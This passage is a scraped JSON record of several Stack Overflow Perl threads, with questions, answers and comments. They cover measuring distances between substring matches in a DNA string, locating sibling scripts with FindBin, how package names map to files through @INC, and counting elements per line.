"is_accepted": true, "score": 1, "last_activity_date": 1494846259, "last_edit_date": 1494846259, "creation_date": 1494844524, "answer_id": 43977297, "question_id": 43976505, "link": "https://stackoverflow.com/questions/43976505/distance-between-matched-substrings/43977297#43977297", "title": "Distance between matched substrings", "body": "<p>I normally do not recommend answering posts where it is obvious the OP just wants other people to do their work. However, there is already one answer the use of which will be problematic if input strings are largish, so here is something that uses Perl builtins.</p>\n\n<p>The special variable <a href=\"https://metacpan.org/pod/perlvar#@LAST_MATCH_START\" rel=\"nofollow noreferrer\"><code>@-</code></a> stores the positions of matches after a pattern matches.</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse Data::Dumper;\n\nmy $string = 'AACCGGTTACGTTTGGCCAAACGTTTTTTGGGGAAACCCACGTACGTAAAGCCGGTTAAACGT';\n\nmy @pos;\n\nwhile ( $string =~ /ACGT/g ) {\n    push @pos, $-[0];\n}\n\nmy @dist;\n\nfor my $i (1 .. $#pos) {\n    push @dist, $pos[$i] - $pos[$i - 1];\n}\n\nprint Dumper(\\@pos, \\@dist);\n</code></pre>\n\n<p>This method uses less memory than splitting the original string (which may be a problem if the original string is large enough). Its memory footprint can be further reduced, but I focused on clarity by showing the accumulation of match positions and the calculation of deltas separately.</p>\n\n<p>One open question is whether you want the index of the first match from the beginning of the string. Strictly speaking, \"distances between matches\" excludes that.</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse Data::Dumper;\n\nmy $string = 'AACCGGTTACGTTTGGCCAAACGTTTTTTGGGGAAACCCACGTACGTAAAGCCGGTTAAACGT';\n\nmy @dist;\nmy $last;\n\nwhile ($string =~ /ACGT/g) {\n    no warnings 'uninitialized';\n    push @dist, $-[0] - $last;\n    $last = $-[0];\n}\n\n# Do we want the distance of the first\n# match from the beginning of the string?\n\nshift @dist;\n\nprint Dumper \\@dist;\n</code></pre>\n\n<p>Of course, it is possible to use <code>index</code> for this as well, but it looks considerably uglier.</p>\n"}], "owner": {"reputation": 3, "user_id": 8013496, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8b15fdaf770e3adacc9f8beacf994eda?s=128&d=identicon&r=PG&f=1", "display_name": "Anna", "link": "https://stackoverflow.com/users/8013496/anna"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 54, "favorite_count": 0, "accepted_answer_id": 43977297, "answer_count": 2, "score": -2, "last_activity_date": 1494856160, "creation_date": 1494842256, "last_edit_date": 1494849449, "question_id": 43976505, "link": "https://stackoverflow.com/questions/43976505/distance-between-matched-substrings", "title": "Distance between matched substrings", "body": "<p>I have a chromosome sequence and have to find subsequences in it and the distances between them.</p>\n\n<p>For example:</p>\n\n<p>string:</p>\n\n<blockquote>\n  <p>AACCGGTTACGTTTGGCCAAACGTTTTTTGGGGAAACCCACGTACGTAAAGCCGGTTAAACGT</p>\n</blockquote>\n\n<p>Substring:</p>\n\n<blockquote>\n  <p>ACGT</p>\n</blockquote>\n\n<p>I have to find the distance between all occurrences of <code>ACGT</code>.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 0, "creation_date": 1494841813, "post_id": 43976211, "comment_id": 74982047, "body": "you could use <code>chdir</code> first?"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 1, "creation_date": 1494841819, "post_id": 43976211, "comment_id": 74982048, "body": "I think you need <code>FindBin</code>. But I also think you might have an <code>XY problem</code>."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1494842317, "post_id": 43976211, "comment_id": 74982374, "body": "What is wrong with listing callable scripts with their full path in one place in your program (using <code>FindBin</code> for the &quot;main&quot; one)?"}], "answers": [{"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1494867451, "post_id": 43976504, "comment_id": 74999108, "body": "<code>$RealBin</code> is the same as <code>$Bin</code>, except it also works if someone creates a symlink to the script. <code>$RealBin</code> should therefore be used instead of <code>$Bin</code>."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1494921803, "post_id": 43976504, "comment_id": 75019912, "body": "@ikegami I agree it&#39;s worth pointing out the difference between <code>$Bin</code> and <code>$RealBin</code>. I think that we don&#39;t know enough about the situation here to say which is best to use."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1494943421, "post_id": 43976504, "comment_id": 75035708, "body": "That makes no sense. <code>$RealBin</code> <i>adds</i> support for symbolic links without taking anything away, so <code>$RealBin</code> is always the best to use."}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": true, "score": 3, "last_activity_date": 1494842251, "creation_date": 1494842251, "answer_id": 43976504, "question_id": 43976211, "link": "https://stackoverflow.com/questions/43976211/perl-call-scripts-from-another-script-with-relative-path/43976504#43976504", "title": "Perl - call scripts from another script with relative path", "body": "<p>Sounds like you want the <a href=\"https://metacpan.org/pod/FindBin\" rel=\"nofollow noreferrer\">FindBin</a> module</p>\n\n<pre><code>use FindBin '$Bin'; # $Bin will contain the directory containing the executable file\n\n# Then, later in your code\nsystem($^X, \"$Bin/script.pl\", @ARGV);\n</code></pre>\n"}], "owner": {"reputation": 561, "user_id": 1974272, "user_type": "registered", "accept_rate": 39, "profile_image": "https://www.gravatar.com/avatar/40fd8c37aba4fc96a6788942e4694360?s=128&d=identicon&r=PG&f=1", "display_name": "Epligam", "link": "https://stackoverflow.com/users/1974272/epligam"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 212, "favorite_count": 0, "accepted_answer_id": 43976504, "answer_count": 1, "score": -2, "last_activity_date": 1494844696, "creation_date": 1494841499, "last_edit_date": 1494844696, "question_id": 43976211, "link": "https://stackoverflow.com/questions/43976211/perl-call-scripts-from-another-script-with-relative-path", "title": "Perl - call scripts from another script with relative path", "body": "<p>I have Perl script that call other Perl scripts, I use this line for that :</p>\n\n<pre><code>system($^X, \"script.pl\", @ARGV); \n</code></pre>\n\n<p>All scripts exists on same folder but I want to call the main one from another folder, meaning scripts are under D:\\TEST\\Perl but I open command line from C:\\ and call the main one from this location.</p>\n\n<p>Probably a Silly question, but how can I call the child scripts that their location is relative to the main one?\nDo I really need to use module for that? Which one?</p>\n"}, {"tags": ["perl", "oop"], "comments": [{"owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 2, "creation_date": 1494838591, "post_id": 43974362, "comment_id": 74979961, "body": "Calling <code>File::MP3-&gt;new()</code> <i>within</i> the package/class <code>File::MP3</code> seems strange. First, explict reference to the current namespace (<code>File::MP3</code>) is not required when calling the <code>new</code> method of the current class <i>within</i> the same class. Maybe I am missing something? Did you mean <code>use File::MP3</code> instead of <code>package File::MP3</code>?"}, {"owner": {"reputation": 536, "user_id": 5629538, "user_type": "registered", "accept_rate": 75, "profile_image": "https://lh4.googleusercontent.com/-huq9GTU2WCA/AAAAAAAAAAI/AAAAAAAAABQ/Ncnqtq-jT7s/photo.jpg?sz=128", "display_name": "Bill Grates", "link": "https://stackoverflow.com/users/5629538/bill-grates"}, "reply_to_user": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 0, "creation_date": 1494840028, "post_id": 43974362, "comment_id": 74980884, "body": "No, I meant what it says. The link for the snippet is the Perl documentation <a href=\"http://perldoc.perl.org/perlobj.html\" rel=\"nofollow noreferrer\">perlobj</a> under the Inheritance heading."}, {"owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 3, "creation_date": 1494840241, "post_id": 43974362, "comment_id": 74981015, "body": "I think that the last two lines 3-4 in that example belong in a different file"}], "answers": [{"comments": [{"owner": {"reputation": 536, "user_id": 5629538, "user_type": "registered", "accept_rate": 75, "profile_image": "https://lh4.googleusercontent.com/-huq9GTU2WCA/AAAAAAAAAAI/AAAAAAAAABQ/Ncnqtq-jT7s/photo.jpg?sz=128", "display_name": "Bill Grates", "link": "https://stackoverflow.com/users/5629538/bill-grates"}, "edited": false, "score": 0, "creation_date": 1494837542, "post_id": 43974611, "comment_id": 74979340, "body": "You mean having the package name declaration <code>package Math::Poisson</code> or <code>package Poisson</code> will have the same effect in the file Poisson.pm, given that it is in the Math folder? Is it just acc. to my convenience?"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 536, "user_id": 5629538, "user_type": "registered", "accept_rate": 75, "profile_image": "https://lh4.googleusercontent.com/-huq9GTU2WCA/AAAAAAAAAAI/AAAAAAAAABQ/Ncnqtq-jT7s/photo.jpg?sz=128", "display_name": "Bill Grates", "link": "https://stackoverflow.com/users/5629538/bill-grates"}, "edited": false, "score": 0, "creation_date": 1494841069, "post_id": 43974611, "comment_id": 74981564, "body": "@BillGates no. The package name is exactly what you write down. Perl expects a file that provides the package <code>Foo::Bar</code> to be in the file <code>Foo&#47;Bar.pm</code>. If you say <code>use Foo::Bar</code> Perl will look in every folder that is included in <code>@INC</code> for a folder <code>Foo</code> with a file <code>Bar.pm</code>, then <code>require</code> that file, and then call <code>Foo::Bar-&gt;import</code>."}, {"owner": {"reputation": 536, "user_id": 5629538, "user_type": "registered", "accept_rate": 75, "profile_image": "https://lh4.googleusercontent.com/-huq9GTU2WCA/AAAAAAAAAAI/AAAAAAAAABQ/Ncnqtq-jT7s/photo.jpg?sz=128", "display_name": "Bill Grates", "link": "https://stackoverflow.com/users/5629538/bill-grates"}, "edited": false, "score": 0, "creation_date": 1494841837, "post_id": 43974611, "comment_id": 74982059, "body": "It is confusing because I made a module named <code>Module.pm</code> in <code>lib</code> folder, &amp; then named the package as <code>package lib::Module</code>, still Perl finds the module using <code>use lib::Module</code>. I now have to use it in code by <code>$lib::Module::variable</code> instead of <code>$Module::variable</code>. But why did Perl find a package named <code>lib::Module</code> inside the <code>lib</code> folder when the expected statement should be <code>use lib::lib::Module</code>?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 536, "user_id": 5629538, "user_type": "registered", "accept_rate": 75, "profile_image": "https://lh4.googleusercontent.com/-huq9GTU2WCA/AAAAAAAAAAI/AAAAAAAAABQ/Ncnqtq-jT7s/photo.jpg?sz=128", "display_name": "Bill Grates", "link": "https://stackoverflow.com/users/5629538/bill-grates"}, "edited": false, "score": 0, "creation_date": 1494842744, "post_id": 43974611, "comment_id": 74982658, "body": "@BillGates  If the module file is called <code>Module.pm</code> and it is in a folder <code>lib</code> then its package should indeed be named <code>package lib::Module</code> and it should indeed be used as <code>use lib::Module;</code>.  This is how it works, the <code>use</code> uses <code>require</code> which parses <code>lib::Module</code> so to look for a file <code>Module.pm</code> in a folder <code>lib</code> (see my answer)."}, {"owner": {"reputation": 536, "user_id": 5629538, "user_type": "registered", "accept_rate": 75, "profile_image": "https://lh4.googleusercontent.com/-huq9GTU2WCA/AAAAAAAAAAI/AAAAAAAAABQ/Ncnqtq-jT7s/photo.jpg?sz=128", "display_name": "Bill Grates", "link": "https://stackoverflow.com/users/5629538/bill-grates"}, "edited": false, "score": 0, "creation_date": 1494844411, "post_id": 43974611, "comment_id": 74983735, "body": "@Borodin Thanks. At last, you got exactly where I was struggling at past 2 hours. Accepted."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1494848289, "post_id": 43974611, "comment_id": 74986117, "body": "@zdim: I think that&#39;s very misleading. Ordinarily <code>.&#47;lib</code> will be in <code>@INC</code> while the package is called <code>Module</code>."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1494866744, "post_id": 43974611, "comment_id": 74998702, "body": "@Borodin I think they meant a <code>lib</code> somewhere else, since they say that <code>use lib::Module;</code> works (not <code>use Module;</code>).  Either way, it&#39;s been cleared up."}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 3, "last_activity_date": 1494848958, "last_edit_date": 1592644375, "creation_date": 1494836680, "answer_id": 43974611, "question_id": 43974362, "link": "https://stackoverflow.com/questions/43974362/what-do-the-chained-namespace-identifiers-in-perl-do/43974611#43974611", "title": "What do the chained namespace identifiers in Perl do?", "body": "<h3>Update</h3>\n<blockquote>\n<p>I made a module named <code>Module.pm</code> in <code>lib</code> folder, &amp; then named the package as <code>package lib::Module</code></p>\n</blockquote>\n<p>You're getting a little confused</p>\n<p>When <code>use</code> or <code>require</code> is actioned, Perl will form a <em>relative path</em> from the package name by changing something like <code>My::Other::Module</code> to <code>My/Other/Module.pm</code> using the obvious substitutions</p>\n<p>It will look for that relative path in the list of locations in the built-in <code>@INC</code> array, which contains some paths that were defined when perl was built and others that may be added at run time</p>\n<p>Up until very recently, <code>@INC</code> contained the current working directory, <code>.</code>, so if you have your module in <code>./lib/My/Other/Module.pm</code> then the Perl compiler will find it if you <code>use lib::My::Other::Module.pm</code>. But that's not how it's meant to work</p>\n<p>You should add <code>./lib</code> to <code>@INC</code> (using either <code>use lib './lib'</code><sup>[1]</sup> or by adding to the value of the environment variable <code>PERL5LIB</code>) and then <code>use My::Other::Module</code>. That will work fine because perl is looking for the .pm file in in <code>./lib</code>. The name and path to the .pm file, the <code>package</code> statement, and the <code>use</code> statement should all agree about what the name is</p>\n<p><strong>[1]</strong> <em>Note that it is a security risk to add relative paths to <code>@INC</code>. That is why <code>.</code> is no longer included as standard in the release client for Perl v5.26. That means you shouldn't <code>use lib './lib'</code> as described above. Instead you need something like <code>use lib '/var/users/Me/Perl/source/lib'</code></em></p>\n<br/>\n<hr />\n<p>A package name like <code>File::MP3</code> is just a name. Perl's only requirement is that it has to be unique</p>\n<p>But modules are grouped into <em>families</em> in CPAN, and most <em>file-related</em> modules begin with <code>File::</code>. There is also <code>Win32::</code>, <code>Net::</code>, <code>Math::</code> etc.</p>\n<p>It is also used to indicate subsidiary modules in a suite. For instance, <code>Mojo::Message</code> contains the code common to both <code>Mojo::Message::Request</code> and <code>Mojo::Message::Response</code>. But that is a mnemonic for the programmer's convenience only</p>\n<p>In the case of <code>Math::Poisson</code>, perl will look for a file <code>Math/Poisson.pm</code> which should have a <code>package</code> declaration <code>package Math::Poisson</code>. If you use that package name elsewhere then anything you declare will be inserted into the module's namespace</p>\n"}, {"comments": [{"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 0, "creation_date": 1494840196, "post_id": 43975243, "comment_id": 74980985, "body": "Actually, <code>File&#47;MP3.pm</code> need not exist if a coderef in <code>@INC</code> takes care of <code>require</code>ing the file."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 2, "creation_date": 1494842170, "post_id": 43975243, "comment_id": 74982291, "body": "@Sinan&#220;n&#252;r I held back from mentioning exceptions and workarounds, thinking that this is more of a basic question. (Didn&#39;t know that it can be a coderef in <code>@INC</code> -- thank you!)"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 1, "creation_date": 1494956491, "post_id": 43975243, "comment_id": 75044447, "body": "@Sinan&#220;n&#252;r  Thanks for the full example of what you mentioned! (Even as you then removed it. I hope you don&#39;t mind that I peeked :)  It&#39;s quite interesting."}, {"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 0, "creation_date": 1494960129, "post_id": 43975243, "comment_id": 75046595, "body": "Of course, not. The OP&#39;s question really was different than what the title said. One can do fun things with coderefs in <code>@INC</code>. Reminds me of the time I deduced a dependency tree for a codebase that could not be run because none of the dependencies were there. See also, for example, <a href=\"https://metacpan.org/pod/Require::Hook::MetaCPAN\" rel=\"nofollow noreferrer\">Require::Hook::MetaCPAN</a>. <code>perldoc -f require</code>: &quot;<i>You can also insert hooks into the import facility by putting Perl code directly into the @INC array. There are three forms of hooks: subroutine references, array references, and blessed objects.</i>&quot;"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 1, "creation_date": 1495051111, "post_id": 43975243, "comment_id": 75094076, "body": "@Sinan&#220;n&#252;r  Thank you. That module seems extremely interesting and a great example.  Thanks for the <code>require</code> tip, I never noticed that part.  I respect Perl&#39;s docs and try to be aware of what&#39;s in them ... but there is a lot.  Need to keep re-reading all the time."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": false, "score": 2, "last_activity_date": 1495745770, "last_edit_date": 1495745770, "creation_date": 1494838731, "answer_id": 43975243, "question_id": 43974362, "link": "https://stackoverflow.com/questions/43974362/what-do-the-chained-namespace-identifiers-in-perl-do/43975243#43975243", "title": "What do the chained namespace identifiers in Perl do?", "body": "<p>The <code>File::MP3</code> in the <a href=\"https://perldoc.perl.org/functions/package.html\" rel=\"nofollow noreferrer\">package</a> declaration is just a name.  However, if you want to <a href=\"http://perldoc.perl.org/functions/use.html\" rel=\"nofollow noreferrer\">use</a> that package then the name matters.  The <code>use</code> dispatches to <a href=\"http://perldoc.perl.org/functions/require.html\" rel=\"nofollow noreferrer\">require</a>, for which the name in <code>require EXPR</code> is</p>\n\n<blockquote>\n  <p>If EXPR is a bareword, require assumes a <em>.pm</em> extension and replaces <code>::</code> with <code>/</code> in the filename for you, to make it easy to load standard modules. This form of loading of modules does not risk altering your namespace.</p>\n</blockquote>\n\n<p>Thus if you want to <code>use File::MP3</code> then an <em><code>MP3.pm</code></em> file had better be in a <em><code>File/</code></em> directory, which needs to be in one of (the absolute-path) directories listed in <code>@INC</code>.</p>\n\n<p>The class <code>File</code> from which <code>File::MP3</code> inherits has nothing to do with the directory <em><code>File/</code></em>. The <code>use parent</code> (see <a href=\"https://perldoc.perl.org/parent.html\" rel=\"nofollow noreferrer\">parent</a>) independently specifies the package to load for the class <code>File</code>, and its <em><code>File.pm</code></em> file also has to be found in <code>@INC</code>.</p>\n\n<p>The <em><code>MP3.pm</code></em> file with the package may well be in a <em><code>Media/</code></em> directory, in which case it would be best named as <code>package Media::MP3;</code> and would be loaded with <code>use Media::MP3;</code> &ndash; and it can still inherit from the <code>File</code> class by <code>use parent File;</code></p>\n\n<p>Placing file-related modules in a directory named <em><code>File</code></em> does make sense, of course.</p>\n"}], "owner": {"reputation": 536, "user_id": 5629538, "user_type": "registered", "accept_rate": 75, "profile_image": "https://lh4.googleusercontent.com/-huq9GTU2WCA/AAAAAAAAAAI/AAAAAAAAABQ/Ncnqtq-jT7s/photo.jpg?sz=128", "display_name": "Bill Grates", "link": "https://stackoverflow.com/users/5629538/bill-grates"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 91, "favorite_count": 0, "accepted_answer_id": 43974611, "answer_count": 2, "score": 0, "last_activity_date": 1508599402, "creation_date": 1494835823, "last_edit_date": 1508599402, "question_id": 43974362, "link": "https://stackoverflow.com/questions/43974362/what-do-the-chained-namespace-identifiers-in-perl-do", "title": "What do the chained namespace identifiers in Perl do?", "body": "<p>I found a code snippet which goes like this:</p>\n\n<pre><code>package File::MP3;\nuse parent 'File';    # sets @File::MP3::ISA = ('File');\nmy $mp3 = File::MP3-&gt;new( 'Andvari.mp3', $data );\n$mp3-&gt;save();\n</code></pre>\n\n<p>Here, I want to ask if <code>File::MP3</code> is just a name (it is named that way <em>just</em> to show that it inherits from <code>File</code>)</p>\n\n<p><strong>OR</strong></p>\n\n<p>We have to name it that way if it inherits from <code>File</code>?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1494862685, "post_id": 43973831, "comment_id": 74996182, "body": "Your data appears to contain no tab characters. If I change to <code>split &#39; &#39;, $line</code> (which splits on any amount of any white space) then I see <code>NN:3</code> on stdout. That makes sense, because the second line of data contains <code>NN</code> 14 times; your loop starts at 11, and 14 - 11 is 3. Nothing is ever written to your <code>Out</code> file handle because no lines contain <code>rs#</code>."}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 8012816, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/efcf99bd843b37a8f71a94f669139736?s=128&d=identicon&r=PG&f=1", "display_name": "Sandip", "link": "https://stackoverflow.com/users/8012816/sandip"}, "edited": false, "score": 0, "creation_date": 1494838438, "post_id": 43974205, "comment_id": 74979864, "body": "Thanks for reply. Can you please post short code here."}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "reply_to_user": {"reputation": 1, "user_id": 8012816, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/efcf99bd843b37a8f71a94f669139736?s=128&d=identicon&r=PG&f=1", "display_name": "Sandip", "link": "https://stackoverflow.com/users/8012816/sandip"}, "edited": false, "score": 0, "creation_date": 1494839820, "post_id": 43974205, "comment_id": 74980737, "body": "Use <code>%count = ();</code> to clear the hash. Use <code>use strict; use warnings;</code> to turn on strict and warnings."}, {"owner": {"reputation": 1, "user_id": 8012816, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/efcf99bd843b37a8f71a94f669139736?s=128&d=identicon&r=PG&f=1", "display_name": "Sandip", "link": "https://stackoverflow.com/users/8012816/sandip"}, "edited": false, "score": 0, "creation_date": 1494848567, "post_id": 43974205, "comment_id": 74986284, "body": "Thank you very much.. I will try."}], "tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": false, "score": 0, "last_activity_date": 1494835254, "creation_date": 1494835254, "answer_id": 43974205, "question_id": 43973831, "link": "https://stackoverflow.com/questions/43973831/counting-specific-element-line-by-line/43974205#43974205", "title": "Counting specific element line by line", "body": "<p>You don't clear %count before moving to a next line.</p>\n\n<p>Why don't you use <a href=\"http://p3rl.org/strict\" rel=\"nofollow noreferrer\">strict</a> and <a href=\"http://p3rl.org/warnings\" rel=\"nofollow noreferrer\">warnings</a>? Using <code>%count;</code> on line 6 does nothing, it's cleaner to limit its scope to the loop only - so you don't even need to clear it.</p>\n"}, {"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1494863150, "post_id": 43978026, "comment_id": 74996507, "body": "That is very clumsy. It will count a single entry of <code>NNN</code> as one, and <code>NNNN</code> as two. It is also counter-productive to use the arcane <code>$scalar = () =</code> when a temporary array variable would make things much clearer. You should rely on the compiler to optimise unless you need special performance. Over all, <code>my $num_nn = grep &#47;NN&#47;, split &#39; &#39;, $line</code> is much more appropriate."}], "tags": [], "owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "is_accepted": false, "score": 0, "last_activity_date": 1494846825, "creation_date": 1494846825, "answer_id": 